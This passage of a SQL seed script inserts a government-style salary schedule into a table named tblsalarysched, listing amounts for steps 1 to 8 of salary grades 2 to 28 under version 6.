INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '2', '11942.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '2', '12034.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '2', '12126.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '2', '12219.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '2', '12313.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '2', '12407.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '3', '12466.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '3', '12562.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '3', '12658.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '3', '12756.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '3', '12854.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '3', '12952.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '3', '13052.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '3', '13152.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '4', '13214.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '4', '13316.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '4', '13418.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '4', '13521.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '4', '13625.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '4', '13729.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '4', '13835.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '4', '13941.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '5', '14007.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '5', '14115.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '5', '14223.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '5', '14332.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '5', '14442.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '5', '14553.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '5', '14665.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '5', '14777.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '6', '14847.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '6', '14961.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '6', '15076.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '6', '15192.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '6', '15309.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '6', '15426.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '6', '15545.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '6', '15664.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '7', '15738.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '7', '15859.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '7', '15981.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '7', '16104.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '7', '16227.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '7', '16352.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '7', '16477.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '7', '16604.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '8', '16758.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '8', '16910.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '8', '17063.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '8', '17217.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '8', '17372.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '8', '17529.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '8', '17688.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '8', '17848.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '9', '17975.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '9', '18125.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '9', '18277.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '9', '18430.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '9', '18584.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '9', '18739.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '9', '18896.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '9', '19054.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '10', '19233.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '10', '19394.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '10', '19556.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '10', '19720.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '10', '19884.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '10', '20051.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '10', '20218.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '10', '20387.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '11', '20754.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '11', '21038.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '11', '21327.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '11', '21619.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '11', '21915.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '11', '22216.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '11', '22520.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '11', '22829.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '12', '22938.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '12', '23222.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '12', '23510.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '12', '23801.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '12', '24096.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '12', '24395.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '12', '24697.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '12', '25003.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '13', '25232.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '13', '25545.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '13', '25861.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '13', '26181.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '13', '26506.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '13', '26834.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '13', '27166.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '13', '27503.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '14', '27755.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '14', '28099.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '14', '28447.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '14', '28800.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '14', '29156.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '14', '29517.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '14', '29883.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '14', '30253.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '15', '30531.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '15', '30909.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '15', '31292.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '15', '31680.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '15', '32072.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '15', '32469.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '15', '32871.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '15', '33279.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '16', '33584.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '16', '34000.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '16', '34421.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '16', '34847.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '16', '35279.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '16', '35716.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '16', '36159.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '16', '36606.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '17', '36942.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '17', '37400.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '17', '37863.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '17', '38332.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '17', '38807.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '17', '39288.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '17', '39774.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '17', '40267.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '18', '40637.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '18', '41140.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '18', '41650.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '18', '42165.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '18', '42688.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '18', '43217.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '18', '43752.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '18', '44294.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '19', '45269.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '19', '46008.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '19', '46759.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '19', '47522.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '19', '48298.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '19', '49086.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '19', '49888.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '19', '50702.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '20', '51155.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '20', '51989.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '20', '52838.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '20', '53700.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '20', '54577.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '20', '55468.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '20', '56373.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '20', '57293.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '21', '57805.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '21', '58748.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '21', '59707.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '21', '60681.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '21', '61672.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '21', '62678.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '21', '63701.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '21', '64741.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '22', '65319.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '22', '66385.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '22', '67469.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '22', '68570.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '22', '69689.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '22', '70827.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '22', '71983.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '22', '73157.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '23', '73811.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '23', '75015.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '23', '76240.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '23', '77484.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '23', '78749.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '23', '80034.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '23', '81340.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '23', '82668.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '24', '83406.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '24', '84767.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '24', '86151.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '24', '87557.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '24', '88986.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '24', '90439.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '24', '91915.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '24', '93415.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '25', '95083.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '25', '96635.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '25', '98212.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '25', '99815.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '25', '101444.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '25', '103100.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '25', '104783.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '25', '106493.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '26', '107444.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '26', '109197.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '26', '110980.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '26', '112791.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '26', '114632.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '26', '116503.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '26', '118404.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '26', '120337.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '27', '121411.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '27', '123393.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '27', '125407.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '27', '127454.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '27', '129534.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '27', '131648.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '27', '133797.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '27', '135981.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '28', '137195.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '28', '139434.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '28', '141710.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '28', '144023.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '28', '146373.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '28', '148763.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '28', '151191.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '28', '153658.00', '6');
